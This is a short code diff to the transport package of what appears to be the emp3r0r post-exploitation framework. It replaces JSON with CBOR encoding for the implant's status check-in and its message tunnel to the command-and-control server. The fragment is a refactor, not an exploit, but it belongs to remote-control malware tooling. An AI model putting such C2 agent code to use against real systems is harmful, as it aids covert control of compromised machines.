@@ -2,7 +2,6 @@ package c2transport
 
 import (
 	"context"
-	"encoding/json"
 	"fmt"
 	"io"
 	"net"
@@ -14,6 +13,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/fxamacker/cbor/v2"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/google/uuid"
@@ -33,7 +33,7 @@ func ReportStatus(info *def.Emp3r0rAgent) (err error) {
 		return err
 	}
 	defer conn.Close()
-	out := json.NewEncoder(conn)
+	out := cbor.NewEncoder(conn)
 	err = out.Encode(info)
 	if err == nil {
 		logging.Println("Checked in")
@@ -96,8 +96,8 @@ var (
 // MsgTunneler use the connection (CCConn)
 func MsgTunneler(callback func(*def.MsgTunData), ctx context.Context, cancel context.CancelFunc) (err error) {
 	var (
-		in  = json.NewDecoder(def.CCMsgConn)
-		out = json.NewEncoder(def.CCMsgConn)
+		in  = cbor.NewDecoder(def.CCMsgConn)
+		out = cbor.NewEncoder(def.CCMsgConn)
 		msg def.MsgTunData // data being exchanged in the tunnel
 	)
 	go catchInterruptAndExit(cancel)
@@ -120,7 +120,7 @@ func MsgTunneler(callback func(*def.MsgTunData), ctx context.Context, cancel con
 			// read response
 			err = in.Decode(&msg)
 			if err != nil {
-				logging.Print("Check CC response: JSON msg decode: ", err)
+				logging.Print("Check CC response: CBOR msg decode: ", err)
 				break
 			}
 			resp := msg.Response
